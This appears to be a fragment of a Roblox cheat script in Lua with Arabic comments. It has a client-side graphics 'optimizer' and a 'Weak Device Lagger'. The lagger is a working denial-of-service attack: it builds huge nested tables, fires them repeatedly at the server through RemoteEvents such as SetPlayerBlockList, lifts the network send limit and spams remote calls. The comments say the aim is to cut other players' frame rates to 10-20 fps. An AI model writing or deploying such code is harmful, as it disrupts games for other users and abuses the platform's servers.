-- OPTIMIZER SYSTEM
-- ============================================
local originalSettings = {}
local function startOptimizer()
    if Enabled.Optimizer then return end
    Enabled.Optimizer = true
    
    originalSettings.QualityLevel = settings().Rendering.QualityLevel
    originalSettings.GlobalShadows = Lighting.GlobalShadows
    originalSettings.Fog = Lighting.FogEnd
    originalSettings.Brightness = Lighting.Brightness
    
    pcall(function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        Lighting.Brightness = 2
    end)
    
    local function cleanObject(obj)
        pcall(function()
            if obj:IsA("Texture") or obj:IsA("Decal") then
                obj:Destroy()
            elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
                obj:Destroy()
            elseif obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
                obj:Destroy()
            elseif obj:IsA("BasePart") then
                obj.Material = Enum.Material.Plastic
                obj.CastShadow = false
            elseif obj:IsA("Explosion") then
                obj:Destroy()
            end
        end)
    end
    
    for _, obj in ipairs(workspace:GetDescendants()) do
        cleanObject(obj)
    end
    
    Connections.optimizer = workspace.DescendantAdded:Connect(cleanObject)
end

local function stopOptimizer()
    Enabled.Optimizer = false
    if Connections.optimizer then
        Connections.optimizer:Disconnect()
        Connections.optimizer = nil
    end
    
    pcall(function()
        settings().Rendering.QualityLevel = originalSettings.QualityLevel or Enum.QualityLevel.Level10
        Lighting.GlobalShadows = originalSettings.GlobalShadows ~= false
        Lighting.FogEnd = originalSettings.Fog or 1000
        Lighting.Brightness = originalSettings.Brightness or 1
    end)
end

-- ============================================
-- WEAK DEVICE LAGGER (Targeted 50-60fps → 10-20fps)
-- ============================================
local laggerEnabled = false
local laggerThread = nil

-- إعدادات مخصصة لإسقاط FPS الأجهزة الضعيفة (50-60fps → 10-20fps)
-- الأجهزة المتوسطة (100fps+) تبقى ثابتة
local LAGGER_CONFIG = {
    TableIncrease = 140,        -- ضغط متوسط (أقل من 265 الأصلي، أكثر من 60 الخفيف)
    Tries = 2,                  -- محاولتين لضمان الضغط
    LoopWaitTime = 0.12,        -- توقيت سريع لكن ليس مفرط (0.12s)
    MemoryPressure = true,      -- تفعيل ضغط الذاكرة الخفيف
    NetworkSpam = true          -- تفعيل سبام الشبكة الخفيف
}

local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then return nil end
    return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    
    local maximum = getmaxvalue(tableincrease) or 80000
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 12000 == 0 then task.wait() end  -- انتظار أطول قليلاً لمنع التجميد الكامل
    end
    
    -- البحث عن الريموت المستهدف
    local remote = ReplicatedStorage:FindFirstChild("SetPlayerBlockList", true) or 
                   ReplicatedStorage:FindFirstChildOfClass("RemoteEvent") or
                   ReplicatedStorage:FindFirstChild("RemoteEvent", true)
                   
    if remote then
        for i = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                    remote:FireServer(maintable) -- مرتين للضغط المستمر
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
        end
    end
    
    -- ضغط إضافي خفيف على الذاكرة للأجهزة الضعيفة
    if LAGGER_CONFIG.MemoryPressure then
        local temp = {}
        for i = 1, 500 do
            temp[i] = string.rep("LAG", 100)
        end
        temp = nil
    end
end

-- نظام الضغط التدريجي (Gradual FPS Drop)
local function startLaggerLoop()
    local cycleCount = 0
    
    while laggerEnabled do
        cycleCount = cycleCount + 1
        
        -- فتح حدود الشبكة
        pcall(function()
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        end)
        
        -- تنفيذ الضغط الرئيسي
        task.spawn(function()
            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
        end)
        
        -- كل 5 دورات، نضيف ضغط إضافي خفيف (للموبايل الضعيف)
        if cycleCount % 5 == 0 and LAGGER_CONFIG.NetworkSpam then
            task.spawn(function()
                -- إرسال بيانات فارغة متكررة (تأخير خفيف للموبايل)
                for i = 1, 3 do
                    pcall(function()
                        local r = ReplicatedStorage:FindFirstChildOfClass("RemoteEvent")
                        if r then r:FireServer({}) end
                    end)
                    task.wait(0.02)
                end
            end)
        end
        
        -- انتظار مناسب للحفاظ على استقرار الأجهزة المتوسطة
        task.wait(LAGGER_CONFIG.LoopWaitTime)
    end
end

local function startLagger()
    if laggerThread then return end
    laggerEnabled = true
    laggerThread = coroutine.create(startLaggerLoop)
    coroutine.resume(laggerThread)
end

local function stopLagger()
    laggerEnabled = false
    if laggerThread then
        coroutine.close(laggerThread)
        laggerThread = nil
    end
end

